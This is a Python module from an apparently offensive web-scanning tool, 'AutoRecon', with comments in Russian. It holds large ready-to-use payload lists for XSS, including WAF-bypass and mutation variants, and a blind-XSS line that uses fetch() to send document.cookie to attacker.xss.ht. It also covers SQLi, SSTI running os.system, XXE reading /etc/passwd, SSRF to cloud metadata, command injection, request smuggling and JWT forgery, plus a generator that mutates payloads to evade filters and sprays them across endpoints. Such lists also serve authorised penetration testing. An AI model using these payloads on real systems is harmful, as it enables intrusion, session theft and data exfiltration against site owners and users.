# xss_security_gui/auto_recon/payloads.py
"""
Расширенные базы XSS и fuzz payloads + генератор для AutoRecon.
"""

from random import choice, randint
from typing import List, Dict, Any

# ============================================================
#  База XSS payloads
# ============================================================
XSS_PAYLOADS: List[str] = [
    # Базовые
    "<script>alert('XSS')</script>",
    "\"><svg/onload=alert(1)>",
    "<img src=x onerror=alert(document.domain)>",

    # DOM-based
    "<script>document.write(document.cookie)</script>",
    "<script>document.write(window.location)</script>",
    "<script>document.write(navigator.userAgent)</script>",
    "<script>document.write(JSON.stringify(localStorage))</script>",
    "<script>document.write(JSON.stringify(sessionStorage))</script>",
    "<script>document.write(document.domain)</script>",
    "<script>document.write(document.body.innerHTML.slice(0,200))</script>",
    "<script>document.write(document.documentElement.outerHTML.slice(0,200))</script>",
    "javascript:alert(1)",
    "#<img src=x onerror=alert(1)>",
    "window.name='<img src=x onerror=alert(1)>'",
    "window.postMessage('<img src=x onerror=alert(1)>','*')",


    # SVG / MathML
    "<svg/onload=alert(1)>",
    "<math><mtext></mtext><script>alert(1)</script>",

    # Event handlers
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",

    # Encoded
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",

    # Polyglots
    "'\"><script>alert(1)</script>",
    "<img src=x onerror=prompt(1)>",
    "<svg/onload=confirm(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",

    # Cookie reflection
    "<img src=x onerror=this.src='/?c='+document.cookie>",

    # Framework-specific
    "{{constructor.constructor('alert(1)')()}}",  # AngularJS
    "{dangerouslySetInnerHTML:{__html:'<img src=x onerror=alert(1)>'}}",  # React
    "{{this.constructor.constructor('alert(1)')()}}",  # Vue
    "$(document).ready(function(){alert(1)});",  # jQuery

    # CSS Injection
    "<style>body{background:url(javascript:alert(1))}</style>",
    "<div style=\"width:expression(alert(1))\">",

    # WAF Bypass
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script/src=data:,alert(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><set onbegin=alert(1) attributeName=x to=1>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "<marquee onstart=alert(1)>",
    "<isindex action=javascript:alert(1) type=image>",
    "<form><button formaction=javascript:alert(1)>X</button>",
    "<math><mrow><mi>x</mi><malignmark></malignmark></mrow><mglyph><svg><mtext><textarea><path id=x><animate attributeName=d values=M0telerik.com dur=1s></animate></path></textarea></mtext></svg></mglyph></math>",

    # Blind XSS (OOB)
    "<script src=//attacker.xss.ht></script>",
    "'\"><script src=//attacker.xss.ht></script>",
    "<img src=x onerror=fetch('//attacker.xss.ht/'+document.cookie)>",
    "<svg/onload=fetch('//attacker.xss.ht/'+document.domain)>",

    # Unicode / encoding bypass
    "\u003cscript\u003ealert(1)\u003c/script\u003e",
    "\x3cscript\x3ealert(1)\x3c/script\x3e",
    "<script>al\\u0065rt(1)</script>",

    # Mutation XSS (mXSS)
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<listing><img src=1 onerror=alert(1)>//</listing>",
    "<xmp><p title=\"</xmp><svg/onload=alert(1)>\">",
]

# ============================================================
#  База fuzz payloads
# ============================================================
FUZZ_PAYLOADS: List[str] = [
    # SQLi
    "' OR 1=1 --",
    "\" OR \"\"=\"",
    "' UNION SELECT NULL --",
    "' AND SLEEP(3) --",
    "'; WAITFOR DELAY '0:0:3' --",
    "' OR IF(1=1,SLEEP(5),0)--",

    # NoSQL Injection
    "{\"$ne\": null}",
    "{\"$gt\": \"\"}",
    "{\"$regex\": \".*\"}",

    # Path Traversal
    "../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "../../../../../../boot.ini",

    # Template Injection
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "{{config.__class__.__init__.__globals__['os'].system('id')}}",

    # XXE
    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",

    # SSRF
    "http://127.0.0.1",
    "http://localhost:80",
    "http://169.254.169.254/latest/meta-data/",
    "http://redis:6379",
    "http://internal-service/api",

    # CRLF Injection
    "test%0d%0aSet-Cookie:crlf=1",
    "%0d%0aX-Injection:1",
    "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK",

    # JSON breakers
    "\"}}]; alert(1); //",
    "]}'; alert(1); //",

    # Command Injection
    "; ls -la",
    "| cat /etc/passwd",
    "&& whoami",

    # LDAP Injection
    "*)(uid=*))(|(uid=*))",
    "(|(uid=*))",

    # XSS polyglots
    "\"><script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",

    # Cookie reflection
    "{{document.cookie}}",
    "${document.cookie}",
    "'+document.cookie+'",

    # localStorage / sessionStorage
    "{{localStorage}}",
    "${localStorage}",
    "'+JSON.stringify(localStorage)+'",
    "{{sessionStorage}}",
    "${sessionStorage}",
    "'+JSON.stringify(sessionStorage)+'",

    # window.location
    "{{window.location}}",
    "${window.location}",
    "'+window.location+'",

    # navigator
    "{{navigator.userAgent}}",
    "${navigator.userAgent}",
    "'+navigator.userAgent+'",

    # DOM
    "{{document.body.innerText}}",
    "${document.body.innerText}",
    "'+document.body.innerText+'",

    # Blind SQLi (time-based)
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' AND BENCHMARK(5000000,SHA1('test'))--",
    "'; SELECT pg_sleep(5)--",

    # SQLi UNION advanced
    "' UNION SELECT username,password FROM users--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "' ORDER BY 100--",

    # Host Header Injection
    "evil.com",
    "localhost@evil.com",
    "evil.com%00.target.com",

    # HTTP Request Smuggling markers
    "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n",

    # Prototype Pollution
    "__proto__[isAdmin]=true",
    "constructor[prototype][isAdmin]=true",
    "__proto__.polluted=true",

    # GraphQL Injection
    "{__schema{types{name,fields{name}}}}",
    "{__type(name:\"User\"){name,fields{name,type{name}}}}",

    # JWT manipulation
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.",

    # XPATH Injection
    "' or '1'='1",
    "' or ''='",
    "1' or '1'='1' or '1'='1",
]

# ============================================================
#  Публичные API-функции
# ============================================================
def generate_xss_payloads() -> List[str]:
    """Возвращает копию расширенного набора XSS payloads."""
    return XSS_PAYLOADS.copy()


def generate_fuzz_payloads() -> List[str]:
    """Возвращает копию расширенного набора fuzz payloads."""
    return FUZZ_PAYLOADS.copy()


# ============================================================
#  Генератор payloads для AutoRecon
# ============================================================
class PayloadGenerator:
    """
    Генератор payload'ов для AutoRecon:
    • выбирает preset
    • мутирует payload при необходимости
    • создаёт GET/POST запросы для всех эндпоинтов
    """

    def __init__(
        self,
        endpoints: List[Dict[str, Any]],
        use_mutation: bool = True,
        preset: str | None = None,
    ):
        self.endpoints = endpoints
        self.use_mutation = use_mutation
        self.preset = preset or choice(XSS_PAYLOADS)

    def generate(self) -> List[Dict[str, Any]]:
        """Генерирует GET/POST payloads для всех endpoints."""
        results = []
        for ep in self.endpoints:
            method = ep.get("method", "GET")
            params = ep.get("params", [])

            payload = self.mutate_payload(self.preset) if self.use_mutation else self.preset

            if method == "GET":
                query = "&".join(f"{k}={payload}" for k in params)
                results.append({
                    "method": "GET",
                    "url": f"{ep['url']}?{query}",
                    "source": ep.get("source", "unknown"),
                })
            elif method == "POST":
                body = {k: payload for k in params}
                results.append({
                    "method": "POST",
                    "url": ep["url"],
                    "json": body,
                    "source": ep.get("source", "unknown"),
                })
        return results

    def mutate_payload(self, base: str) -> str:
        """Создаёт случайную мутацию XSS payload."""
        variants = [
            base.replace("<", "%3C").replace(">", "%3E"),
            base.replace("alert", "confirm"),
            base.replace("alert", "prompt"),
            base.replace("script", "sCrIpT"),
            base.replace("script", "scr\x00ipt"),
            base + f"<!--{randint(100, 999)}-->",
            base.replace("1", str(randint(2, 9))),
            base.replace("XSS", f"X{randint(100, 999)}"),
            base.replace("document.cookie", "document.domain"),
            base.replace("document.cookie", "navigator.userAgent"),
            base.replace("document.cookie", "window.location.href"),
            # Double-encoding
            base.replace("<", "%253C").replace(">", "%253E"),
            # Unicode escapes
            base.replace("<", "\\u003c").replace(">", "\\u003e"),
            # Case randomization
            "".join(c.upper() if randint(0, 1) else c.lower() for c in base),
            # Null-byte injection
            base[:len(base)//2] + "%00" + base[len(base)//2:],
            # Tab/newline insertion
            base.replace(" ", "\t"),
            base.replace(" ", "\n"),
        ]
        return choice(variants)


# ============================================================
#  Публичный API модуля
# ============================================================
# ============================================================
#  Специализированные генераторы
# ============================================================
def generate_sqli_payloads() -> List[str]:
    """Возвращает только SQLi payloads из FUZZ_PAYLOADS."""
    markers = ("OR", "UNION", "SELECT", "SLEEP", "BENCHMARK", "WAITFOR", "pg_sleep", "ORDER BY")
    return [p for p in FUZZ_PAYLOADS if any(m in p.upper() for m in markers)]


def generate_ssti_payloads() -> List[str]:
    """Возвращает SSTI / Template Injection payloads."""
    markers = ("{{7*7}}", "${7*7}", "#{7*7}", "config.__class__")
    return [p for p in FUZZ_PAYLOADS if any(m in p for m in markers)]


def generate_ssrf_payloads() -> List[str]:
    """Возвращает SSRF payloads."""
    return [p for p in FUZZ_PAYLOADS if p.startswith("http://")]


def generate_cmdi_payloads() -> List[str]:
    """Возвращает Command Injection payloads."""
    markers = ("; ", "| ", "&& ", "`")
    return [p for p in FUZZ_PAYLOADS if any(p.startswith(m.strip()) or m in p for m in markers)]


__all__ = [
    "XSS_PAYLOADS",
    "FUZZ_PAYLOADS",
    "generate_xss_payloads",
    "generate_fuzz_payloads",
    "generate_sqli_payloads",
    "generate_ssti_payloads",
    "generate_ssrf_payloads",
    "generate_cmdi_payloads",
    "PayloadGenerator",
]